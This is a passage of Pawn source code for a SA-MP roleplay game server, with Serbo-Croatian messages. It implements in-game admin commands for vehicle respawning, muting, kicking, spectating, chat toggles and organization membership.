	SPD( playerid, dialog_RESETIRAJ, DSL, D_NASLOV, "Osobna vozila\nVozila za poslove\nVozila organizacija i bandi\nRent vozila\nSva prazna vozila\nSve cisterne", D_ODABERI, D_ODUSTANI );
	return 1;
}

CMD:rtcveh( playerid, params[] ) {
	if( PlayerInfo[ playerid ][ xAdmin ] >= 1 ) {
	    if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );

		new car;
		if( sscanf( params, "d", car ) ) return SendUsageMessage( playerid, "/rtcveh [ car id ]");

		if( car != INVALID_VEHICLE_ID ) {

		 	format( globalstring, sizeof( globalstring ), "RTC | %s je respawnao vozilo id %d.", ImeIgraca( playerid ), car );
			AdminPoruka( NARACRVENA, globalstring );
			VehicleObjectCheck( car );
		    SetVehicleToRespawn( car );
		    LinkVehicleToInterior( car, 0 );
			Novi_RemovePlayerFromVehicle( playerid );
		    SCM( playerid, ZUTA, "** Vozilo respawnano !");
		}
		else return SendErrorMessage( playerid, "Pogresan id vozila." );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}

CMD:rtc( playerid, params[] ) {
	if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSupporter ] >= 1 ) {
	    if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
	    new car = GetPlayerVehicleID( playerid );
	    if( IsPlayerInAnyVehicle(playerid)) {
		 	format( globalstring, sizeof( globalstring ), "RTC | %s je respawnao vozilo id %d.", ImeIgraca( playerid ), car );
			AdminPoruka( NARACRVENA, globalstring );
			VehicleObjectCheck( car );
		    SetVehicleToRespawn( car );
		    LinkVehicleToInterior( car, 0 );
			Novi_RemovePlayerFromVehicle( playerid );
		    SCM( playerid, ZUTA, "* Vozilo respawnano !");
	   	}
	   	else return SendErrorMessage( playerid, "Morate biti u vozilu. " );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}

CMD:nick( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 ) {
        if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
		new id;
	    if( sscanf( params, "u", id ) ) return SendUsageMessage( playerid, "/nick [ ID/Deo Imena ]");
        if( id == IPI ) return SendUsageMessage( playerid, "Pogresan ID igraca." );
        
		SendClientMessage( id, 0x33AA33AA,"______________________________________ "SRVBOJA1SCM"Valhalla "col_white"ROLEPLAY ADMIN OBAVIJEST ____________________");
	    SendClientMessage( id, ZUTA,"Server upozorenje: koristis pogresan nick");
	    SendClientMessage( id, ZUTA,">Nick se mora sastojati od imena i prezimena!");
	    SendClientMessage( id, ZUTA,">Koristi ovakav oblik: Ime_Prezime, Prva velika slova(Primjer: Marko_Markovic)");
	    SendClientMessage( id, ZUTA,">Nick ne smije imati brojke i takodjer mora imati crticu izmedju ime i prezime");
	    SendClientMessage( id, 0x33AA33AA,"______________________________________________________________________________________");

        format( globalstring, sizeof( globalstring ), "NICK | %s je kickovan zbog nepravilnog imena od strane %s", ImeIgraca( id ), ImeIgraca( playerid ) );
		AdminPoruka( NARACRVENA, globalstring );
		
	    format( globalstring, sizeof( globalstring ), ""col_white"Kickovani ste! Admin: "col_crvena"%s "col_white"Razlog: "col_crvena"NON-RP ime", ImeIgraca( playerid ) );
		Kickovanje(id, globalstring );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:ukloniradio( playerid, params[] ) {

    if( PlayerInfo[ playerid ][ xAdmin ] >= 4 ) {
        if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );

		if( Boombox_Nearest( playerid ) == INVALID_PLAYER_ID ) return SendErrorMessage( playerid, "Niste pored radia." );

		Boombox_Destroy( Boombox_Nearest( playerid ) );
		SendInfoMessage( playerid, "Sklonili ste radio sa zemlje." );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}


CMD:skloniblokade( playerid, params[] ) {

    if( PlayerInfo[ playerid ][ xAdmin ] >= 4 ) {
        if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );

		DeleteClosestRoadblock( playerid );
		SendInfoMessage( playerid, "Sklonili ste blokade policije u vasoj okolini." );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}

CMD:mute( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[playerid][xSpecAdmin] == 1) {
		new id, vreme, razlog[ 40 ];
	    if( sscanf( params, "uds[40]", id, vreme, razlog ) ) return SendUsageMessage( playerid, "/mute [ ID/Deo Imena ] [vreme] [razlog]");
	    if(PlayerInfo[playerid][xSpecAdmin] == 1 && PlayerInfo[id][xAdmin] >= 1) return SendErrorMessage(playerid, "Ne mozes njega!");
	    if( id != INVALID_PLAYER_ID && PlayerLogged[ id ] != false) {

            if(PlayerInfo[id][xAdmin] >= 5) return SendErrorMessage(playerid, "Ne mozes mute HeadAdmina, Suvlasnika i Vlasnika!");

			PlayerInfo[ id ][ xMute ] = vreme*60;

			format( globalstring, sizeof( globalstring ), "MUTE | %s je usutkan od strane %s", ImeIgraca( id ), ImeIgraca( playerid ) );
			AdminPoruka( NARACRVENA, globalstring );
			SendInfoMessage( playerid, "Usutkali ste igraca na %s minuta %d!", ImeIgraca( id ), vreme );
			SendInfoMessage( id, "Admin %s vas je usutkao na %d minuta. RAZLOG: %s!", ImeIgraca( playerid ), vreme, razlog );


			new string[ 128 ]; 
			format( string, sizeof( string ), "Admin %s je mute igraca %s | Razlog: %s", ImeIgraca( playerid ), ImeIgraca( id ), razlog );
			LogSave( "Ostalo/LogMute.log", string );
		}
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:offmute( playerid, params[] ) {
	if( PlayerInfo[ playerid ][ xAdmin ] >= 2  ) {
	    if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
		new vreme, razlog[40], imeigraca[ 24 ], ifile[ 64 ];
		if( sscanf( params, "s[24]is[40]", imeigraca, vreme, razlog ) ) {
			SendUsageMessage( playerid, "/offmute [ Ime_Prezime ] [ vreme(minuti) ] [ razlog ]");
			return 1;
	    }
	    format( ifile, sizeof( ifile ), I_FILE, imeigraca );
	    if( !fexist( ifile ) ) return SendErrorMessage( playerid, "Taj igrac ne postoji u bazi podataka!");
        if( IsPlayerConnected( GetPlayerIdFromName( imeigraca ) ) ) {
			SendErrorMessage( playerid, "Taj igrac je online tako da izbaci ga online.");
			return 1;
		}
		if( vreme < 1 ) return SendErrorMessage( playerid, "Vreme za mute ne moze biti manje od 1 minut.");

        new INI:File = INI_Open( ifile );
		INI_SetTag( File, "Informacije" );
	    INI_WriteInt( File, "Mute", vreme*60 );
    	INI_WriteString( File, "OffPMute", razlog );
    	INI_Close( File );

		AI[ playerid ][ aTJail ]++;

		SendClientMessageEx( playerid, SVETLOCRVENA, "Postavili ste offline igraca %s mute na %d minuta.Razlog: %s", imeigraca, vreme, razlog );
        new string[ 128 ]; 
		format( string, sizeof( string ), "Admin %s je offmute igraca %s | Razlog: %s", ImeIgraca( playerid ), imeigraca, razlog );
		LogSave( "Ostalo/LogOffMute.log", string );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:unmute( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 2 ) {
		if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );

		new id;
	    if( sscanf( params, "u", id ) ) return SendUsageMessage( playerid, "/unmute [ ID/Deo Imena ]");
		if( id == IPI ) return SendErrorMessage( playerid, "Pogresan ID korisnika." );
	    PlayerInfo[ id ][ xMute ] = 0;

		format( globalstring, sizeof( globalstring ), "UNMUTE | %s je odsutkan od strane %s", ImeIgraca( id ), ImeIgraca( playerid ) );
		AdminPoruka( NARACRVENA, globalstring );
		
		SendInfoMessage( playerid, "Odsutkali ste igraca %s!", ImeIgraca( id ) );
		SendInfoMessage( id, "Admin %s vas je odsutkao!", ImeIgraca( playerid ) );

	}
	return 1;
}
CMD:posaljinatut( playerid, params[] ) {
    new id ;
	if( sscanf( params, "u", id ) ) {
		SendUsageMessage( playerid, "/posaljinatut [ ID/Deo Imena ] ");
		return 1;
	}
	if( PlayerInfo[ playerid ][ xAdmin ] >= 2 ) {
		if( IsPlayerConnected( id ) ) {
  			if( id != INVALID_PLAYER_ID ) {
     			PlayerInfo[ id ][ xRPLearn ] = 1;
     			PlayerInfo[ id ][ xMute ] = 100;
     			SavePlayer( id );
     			TogglePlayerControllable( id, 0 );
        		TimerLearn[ id ] = SetTimerEx( "CityTut", 1000, 0, "ii", id, 1);
        		SendInfoMessage( playerid, "Poslali ste %s na tutorial.", ImeIgraca( id ) );
				SCM( id, ZUTA, "Niste naucili pravila Roleplaya.Primorani ste ih ponovo procitati." );
				format( globalstring, sizeof( globalstring ), "TUT | %s je poslao %s da procita tutorial o Roleplayu.", ImeIgraca( playerid ), ImeIgraca( id ) );
				AdminPoruka( NARACRVENA, globalstring );
				new string[ 128 ]; 
				format( string, sizeof( string ), "Admin %s je poslao na tut igraca %s", ImeIgraca( playerid ), ImeIgraca( id ) );
				LogSave( "Ostalo/LogTUTRP.log", string );
			}
		} else SendErrorMessage( playerid, "Taj igrac nije na serveru!" );
	} else SendErrorMessage( playerid, "Niste ovlasteni za koristenje ove komande!" );
	return 1;
}

CMD:toganimchat( playerid, params[] ) {
    if(GetPVarInt(playerid, "ToggedAnim") == 0) {
		SetPVarInt(playerid, "ToggedAnim", 1);
		SCM( playerid, BELA, "Chat animacije iskljucene !");
	}
	else if(GetPVarInt(playerid, "ToggedAnim") == 1) {
		SetPVarInt(playerid, "ToggedAnim", 0);
		SCM( playerid, BELA, "Chat animacije ukljucene !");
	}
	return 1;
}

CMD:tognews( playerid, params[] ) {
	if( !gNews{ playerid } ) {
		gNews{ playerid } = 1;
		SCM( playerid, 0xBFC0C2FF, "News chat kanal iskljucen!");
	}
	else if( gNews{ playerid } ) {
		gNews{ playerid } = 0;
		SCM( playerid, 0xBFC0C2FF, "News chat kanal ukljucen!");
	}
	return 1;
}

CMD:togg( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] < 6 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
    if( ToggedG == true ) {
		ToggedG = false;
		SCM( playerid, BELA, "G chat je iskljucen !");
		
		format( globalstring, sizeof( globalstring ), "TOGG | %s je ugasio G Chat.", ImeIgraca( playerid ) );
		AdminPoruka( NARACRVENA, globalstring );
	}
	else if( ToggedG == false ) {
		ToggedG = true;
		SCM( playerid, BELA, "G chat je ukljucen !");
		
		format( globalstring, sizeof( globalstring ), "TOGG | %s je ukljucio G Chat.", ImeIgraca( playerid ) );
		AdminPoruka( NARACRVENA, globalstring );
	}
	return 1;
}

CMD:togreport( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
    if( GetPVarInt(playerid, "ToggedReport") == 0 ) {
		SetPVarInt(playerid, "ToggedReport", 1);
		SCM( playerid, BELA, "Report/Pitanja iskljucena !");
	}
	else if(GetPVarInt(playerid, "ToggedReport") == 1) {
		SetPVarInt(playerid, "ToggedReport", 0);
		SCM( playerid, BELA, "Report/Pitanja ukljucena !");
	}
	return 1;
}

CMD:togpomoc( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] < 4 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
    if( GetPVarInt(playerid, "ToggedPomoc") == 0 ) {
		SetPVarInt(playerid, "ToggedPomoc", 1);
		SCM( playerid, BELA, "Pomoc pitanja iskljucena !");
	}
	else if(GetPVarInt(playerid, "ToggedPomoc") == 1) {
		SetPVarInt(playerid, "ToggedPomoc", 0);
		SCM( playerid, BELA, "Pomoc pitanja ukljucena !");
	}
	return 1;
}

CMD:nosms( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
    if( GetPVarInt(playerid, "ToggedPM") == 0 ) {
		SetPVarInt(playerid, "ToggedPM", 1);
		SCM( playerid, BELA, "SMS dostava iskljucena !");
	}
	else if(GetPVarInt(playerid, "ToggedPM") == 1) {
		SetPVarInt(playerid, "ToggedPM", 0);
		SCM( playerid, BELA, "SMS dostava ukljucena !");
	}
	return 1;
}

CMD:togw( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
    if( GetPVarInt(playerid, "ToggedWISP") == 0 ) {
		SetPVarInt(playerid, "ToggedWISP", 1);
		SCM( playerid, BELA, "WISPER dostava iskljucena !");
	}
	else if(GetPVarInt(playerid, "ToggedWISP") == 1) {
		SetPVarInt(playerid, "ToggedWISP", 0);
		SCM( playerid, BELA, "WISPER dostava ukljucena !");
	}
	return 1;
}

CMD:togphone( playerid, params[] ) {
	if( PlayerInfo[ playerid ][ xBrojTelefona ] != 0 ) {
		if( PhoneOnline[ playerid ] == 0 ) {
			PhoneOnline[ playerid ] = 1;
			SCM( playerid, SIVA, "Iskljucio si mobilni telefon!");
		}
		else if( PhoneOnline[ playerid ] > 0 ) {
			PhoneOnline[ playerid ] = 0;
			SCM( playerid, SIVA, "Ukljucio si mobilni telefon!");
		}
	}
	else {
		SendErrorMessage( playerid, "Nemate mobilni telefon!");
		return 1;
	}
	return 1;
}

CMD:togfr( playerid, params[] ) {
    if( GetPVarInt(playerid, "ToggedFR") == 0 ) {
		SetPVarInt(playerid, "ToggedFR", 1);
		SCM( playerid, BELA, "RADIO/F CHAT dostava iskljucena !");
	}
	else if(GetPVarInt(playerid, "ToggedFR") == 1) {
		SetPVarInt(playerid, "ToggedFR", 0);
		SCM( playerid, BELA, "RADIO/F CHAT dostava ukljucena !");
	}
	return 1;
}
CMD:togd( playerid, params[] ) {
    if( GetPVarInt(playerid, "ToggedDC") == 0 ) {
		SetPVarInt(playerid, "ToggedDC", 1);
		SCM( playerid, BELA, "RADIO/F CHAT dostava iskljucena !");
	}
	else if(GetPVarInt(playerid, "ToggedDC") == 1) {
		SetPVarInt(playerid, "ToggedDC", 0);
		SCM( playerid, BELA, "RADIO/F CHAT dostava ukljucena !");
	}
	return 1;
}

CMD:skinisatuta( playerid, params[] ) {
    new id ;
	if( sscanf( params, "u", id ) ) {
		SendUsageMessage( playerid, "/skinisatuta [ ID/Deo Imena ] ");
		return 1;
	}
	if( PlayerInfo[ playerid ][ xAdmin ] >= 2 ) {
		if( IsPlayerConnected( id ) ) {
  			if( id != INVALID_PLAYER_ID ) {
  			    if( PlayerInfo[ id ][ xRPLearn ] == 0 ) return SendErrorMessage( playerid, "Igrac nije na tutorialu o RPu." );
     			PlayerInfo[ id ][ xRPLearn ] = 0;
     			PlayerInfo[ id ][ xMute ] = 0;
     			Novi_KillTimer( TimerLearn[ id ] );
     			Novi_KillTimer( TimerPitanje[ id ] );
     			SavePlayer( id );
     			Novi_SetSpawnInfo( playerid );
    			SpawnPlayer( id );
    			SendInfoMessage( playerid, "Skinuli ste %s sa tutoriala.", ImeIgraca( id ) );
				SCM( id, ZUTA, "Admin vas je skinuo sa learna." );
				format( globalstring, sizeof( globalstring ), "TUT | %s je skinuo %s sa tutoriala o Roleplayu.", ImeIgraca( playerid ), ImeIgraca( id ) );
				AdminPoruka( NARACRVENA, globalstring );
				new string[ 128 ]; 
				format( string, sizeof( string ), "Admin %s je skinuo sa tuta igraca %s", ImeIgraca( playerid ), ImeIgraca( id ) );
				LogSave( "Ostalo/LogTUTRP.log", string );
			}
		} else SendErrorMessage( playerid, "Taj igrac nije na serveru!" );
	} else SendErrorMessage( playerid, "Niste ovlasteni za koristenje ove komande!" );
	return 1;
}

alias:spec("recon");
CMD:spec( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSupporter ] >= 2 || PlayerInfo[playerid][xSpecAdmin] == 1) {
    
		new id;
	    if( sscanf( params, "u", id ) ) return SendUsageMessage( playerid, "/spec [ ID/Deo imena ]");
	    if( id == IPI ) return SendErrorMessage( playerid, "Nepostojeci ID.");
	    if( id == playerid ) return SendErrorMessage( playerid, "Nepostojeci ID.");
	    
        if( PlayerInfo[ playerid ][ xSupporter ] >= 2 ) {
            if( PlayerInfo[ id ][ xSupporter ] == 0 ) return SendErrorMessage( playerid, "Kao vodja helpera mozes specati samo helpere." );
        }
        if(PlayerInfo[playerid][xAdmin] < PlayerInfo[id][xAdmin]) return SendErrorMessage( playerid, "Ne mozes da specas admine vece od sebe." );
		Spectate[ playerid ] = id;
		new Float:health;
		GetPlayerHealth( Spectate[ playerid ], health );
		
		if( WatchingTV{ playerid } == 0 ) {
			GetPlayerPos( playerid, SpecPos[ playerid ][ 0 ], SpecPos[ playerid ][ 1 ],  SpecPos[ playerid ][ 2 ] );
			SpecVW[ playerid ] = GetPlayerVirtualWorld( playerid );
        	SpecInt[ playerid ] = GetPlayerInterior( playerid );
		}
		
		new cash = PlayerInfo[ Spectate[ playerid ] ][ xNovac ];
		new specstring[ 180 ];
		format( specstring, sizeof( specstring ), "~y~ID: ~w~%d ~n~~y~Ime: ~w~%s ~n~~y~Novac: ~w~%d$ ~n~~y~Health: ~w~%1.f~n~~y~Oruzje: ~w~%s(%d m)", id, ImeIgraca( id ), cash, health, WeaponInfos[ GetPlayerWeapon( id ) ][ wName ], GetPlayerAmmo( id ) );
		PlayerTextDrawSetString( playerid, SpecTextDraw[ playerid ], specstring );
		PlayerTextDrawShow( playerid, SpecTextDraw[ playerid ] );
		if( PlayerInfo[ playerid ][ xAdmin ] < 6 ) {
			format( globalstring, sizeof( globalstring ), "SPEC | Admin %s(%d) je zapoceo spec nad %s(%d) .", ImeIgraca( playerid ), playerid, ImeIgraca( id ), id );
			RPTChatVlasnik( NARACRVENA, globalstring );
		}
		WatchingTV{ playerid } = 1;
		new string[ 128 ]; 
		format( string, sizeof( string ), "Admin %s je poceo spec nad igracom %s", ImeIgraca( playerid ), ImeIgraca( id ) );
		LogSave( "Ostalo/LogSPEC.log", string );
    } else return SendErrorMessage( playerid, "Niste ovlasteni za koristenje ove komande!" );
    return true;
}

alias:specoff("uncon");
CMD:specoff( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSupporter ] >= 2 || PlayerInfo[playerid][xSpecAdmin] == 1) {
        if( WatchingTV{ playerid } == 1 ) {
			WatchingTV{ playerid } = 0;
			PlayerTextDrawHide( playerid, SpecTextDraw[ playerid ] );
			TogglePlayerSpectating( playerid, false );
			TogglePlayerControllable( playerid, true );
			Spectate[ playerid ] = -1;
			PlayerPlaySound( playerid, 1145, 0.0, 0.0, 0.0);
			GameTextForPlayer( playerid, "~w~              Spec~n~~r~                Iskljucen", 5000, 6 );
			if( PlayerInfo[ playerid ][ xAdmin ] < 6 ) {
				format( globalstring, sizeof( globalstring ), "SPEC | %s je prestao sa specom.", ImeIgraca( playerid ) );
				RPTChatVlasnik( NARACRVENA, globalstring );
			}
        }
		else {
			SendErrorMessage( playerid, "Nemas spectator ukljucen!" );
		}
    } else SendErrorMessage( playerid, "Niste ovlasteni za koristenje ove komande!" );
	return 1;
}

// Org System
CMD:lider( playerid, params[] ) {
	if( PlayerInfo[ playerid ][ xLider ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu. " );
	SPD( playerid, dialog_LIDER, DSL, D_NASLOV, "Info orge\nUbaci clana\nIzbaci online clana\nIzbaci offline clana\nSpisak svih clanova\nWar\nLokacije organizacije\nUpgrade Vozila\nSavez\nDaj Rank", D_ODABERI, D_ODUSTANI );
	return true;
}

CMD:orgsef( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xClan ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu. " );
    new id = PlayerInfo[ playerid ][ xClan ];
    //Proveri vw i int
    if( !IsPlayerInRangeOfPoint( playerid, 3.0, OI[ id ][ oSafePos ][ 0 ], OI[ id ][ oSafePos ][ 1 ], OI[ id ][ oSafePos ][ 2 ] )) return SendErrorMessage( playerid, "Morate biti pored sefa..");
    if(GetPlayerVirtualWorld(playerid) != OI[id][oVw]) return SendErrorMessage( playerid, "Morate biti pored sefa..");
    if(GetPlayerInterior(playerid) != OI[id][oInt]) return SendErrorMessage( playerid, "Morate biti pored sefa..");

	SPD( playerid, dialog_ORGSAFE, DSL, D_NASLOV,  "Stanje u sefu\nOstavi u sef\nIzvadi iz sefa", D_ODABERI, D_ODUSTANI );
	return true;
}

CMD:napustiorg( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xLider ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristiti ovu komandu." );
	if( PlayerInfo[ playerid ][ xClan ] != 0 ) {
	
		if( PlayerInfo[ playerid ][ xOrgUgovor ] < 10 ) {
		
		    PlayerInfo[ playerid ][ xKazneniUgovor ] = 10;
		    SCM( playerid, SVETLOCRVENA, "Napustio si organizaciju, a nisi ispunio ugovor o vremenu u organizaciji");
			SCM( playerid, SVETLOCRVENA, "Kaznjen si sa 10 sati ne ulaska u organizaciju!");

            new OrgID = PlayerInfo[ playerid ][ xClan ], name[ MAX_PLAYER_NAME ];
			GetPlayerName( playerid, name, sizeof( name ) );

		    if( strcmp( name, OI[ OrgID ][ oClan1 ], true ) == 0 ) { strmid( OI[ OrgID ][ oClan1], "Niko", 0, strlen( "Niko" ), ORG_CLAN); }
			if( strcmp( name, OI[ OrgID ][ oClan2 ], true ) == 0) { strmid( OI[ OrgID ][ oClan2 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan3 ], true ) == 0) { strmid( OI[ OrgID ][ oClan3 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan4 ], true ) == 0) { strmid( OI[ OrgID ][ oClan4 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan5 ], true ) == 0) { strmid( OI[ OrgID ][ oClan5 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan6 ], true ) == 0) { strmid( OI[ OrgID ][ oClan6 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan7 ], true ) == 0) { strmid( OI[ OrgID ][ oClan7 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan8 ], true ) == 0) { strmid( OI[ OrgID ][ oClan8 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan9 ], true ) == 0) { strmid( OI[ OrgID ][ oClan9 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan10 ], true ) == 0) { strmid( OI[ OrgID ][ oClan10 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan11 ], true ) == 0) { strmid( OI[ OrgID ][ oClan11 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan12 ], true ) == 0) { strmid( OI[ OrgID ][ oClan12 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan13 ], true ) == 0) { strmid( OI[ OrgID ][ oClan13 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan14 ], true ) == 0) { strmid( OI[ OrgID ][ oClan14 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan15 ], true ) == 0) { strmid( OI[ OrgID ][ oClan15 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan16 ], true ) == 0) { strmid( OI[ OrgID ][ oClan16 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan17 ], true ) == 0) { strmid( OI[ OrgID ][ oClan17 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan18 ], true ) == 0) { strmid( OI[ OrgID ][ oClan18 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan19 ], true ) == 0) { strmid( OI[ OrgID ][ oClan19 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan20 ], true ) == 0) { strmid( OI[ OrgID ][ oClan20 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan21 ], true ) == 0) { strmid( OI[ OrgID ][ oClan21 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan22 ], true ) == 0) { strmid( OI[ OrgID ][ oClan22 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan23 ], true ) == 0) { strmid( OI[ OrgID ][ oClan23 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan24 ], true ) == 0) { strmid( OI[ OrgID ][ oClan24 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan25 ], true ) == 0) { strmid( OI[ OrgID ][ oClan25 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan26 ], true ) == 0) { strmid( OI[ OrgID ][ oClan26 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan27 ], true ) == 0) { strmid( OI[ OrgID ][ oClan27 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan28 ], true ) == 0) { strmid( OI[ OrgID ][ oClan28 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan29 ], true ) == 0) { strmid( OI[ OrgID ][ oClan29 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan30 ], true ) == 0) { strmid( OI[ OrgID ][ oClan30 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }

            OI[ OrgID ][ oUbacenihClanova ]--;

			PlayerInfo[ playerid ][ xSkin ] = SetSexSkin( playerid ); PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
			
			PlayerInfo[ playerid ][ xClan ] = 0;
			PlayerInfo[ playerid ][ xLider ] = 0;
			PlayerInfo[ playerid ][ xOrgUgovor ] = 0;
			PlayerInfo[ playerid ][ xSpawn ] = SetRandomSpawn(  );
			ResetAllWeapons( playerid );
			SaveOrganization( OrgID );

			SavePlayer( playerid );
		}
		else if( PlayerInfo[ playerid ][ xOrgUgovor ] >= 10 ) {
		    new OrgID = PlayerInfo[ playerid ][ xClan ], name[ MAX_PLAYER_NAME ];
			GetPlayerName( playerid, name, sizeof( name ) );

		    if( strcmp( name, OI[ OrgID ][ oClan1 ], true ) == 0 ) { strmid( OI[ OrgID ][ oClan1], "Niko", 0, strlen( "Niko" ), ORG_CLAN); }
			if( strcmp( name, OI[ OrgID ][ oClan2 ], true ) == 0) { strmid( OI[ OrgID ][ oClan2 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan3 ], true ) == 0) { strmid( OI[ OrgID ][ oClan3 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan4 ], true ) == 0) { strmid( OI[ OrgID ][ oClan4 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan5 ], true ) == 0) { strmid( OI[ OrgID ][ oClan5 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan6 ], true ) == 0) { strmid( OI[ OrgID ][ oClan6 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan7 ], true ) == 0) { strmid( OI[ OrgID ][ oClan7 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan8 ], true ) == 0) { strmid( OI[ OrgID ][ oClan8 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan9 ], true ) == 0) { strmid( OI[ OrgID ][ oClan9 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
